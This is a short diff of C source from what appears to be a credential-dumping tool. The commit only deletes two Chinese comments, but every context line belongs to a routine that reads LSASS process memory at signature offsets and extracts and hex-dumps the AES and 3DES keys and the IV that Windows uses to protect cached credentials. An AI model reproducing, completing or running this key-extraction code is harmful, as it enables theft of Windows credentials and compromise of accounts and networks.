@@ -139,7 +139,6 @@ VOID LocateUnprotectLsassMemoryKeys() {
 		wprintf(L"AES Key Located (len %d): ", extractedAesKey.hardkey.cbSecret);
 		HexdumpBytesPacked(extractedAesKey.hardkey.data, extractedAesKey.hardkey.cbSecret);
 	}
-	// DES部分
 	if (desSigOffset != 0) {
 		ReadFromLsass(lsasrvBaseAddress + desSigOffset + sizeof keyDESSig, &desOffset, sizeof desOffset);
 		ReadFromLsass(lsasrvBaseAddress + desSigOffset + sizeof keyDESSig + 4 + desOffset, &keyPointer, sizeof keyPointer);
@@ -151,7 +150,6 @@ VOID LocateUnprotectLsassMemoryKeys() {
 		wprintf(L"DES Key Located (len %d): ", extracted3DesKey.hardkey.cbSecret);
 		HexdumpBytesPacked(extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);// 回显罢了
 	}
-	// IV部分
 	if (ivSigOffset != 0) {
 		BYTE initializationVector[16] = { 1 };
 		ReadFromLsass(lsasrvBaseAddress + ivSigOffset + sizeof keyIVSig, &ivOffset, sizeof ivOffset);
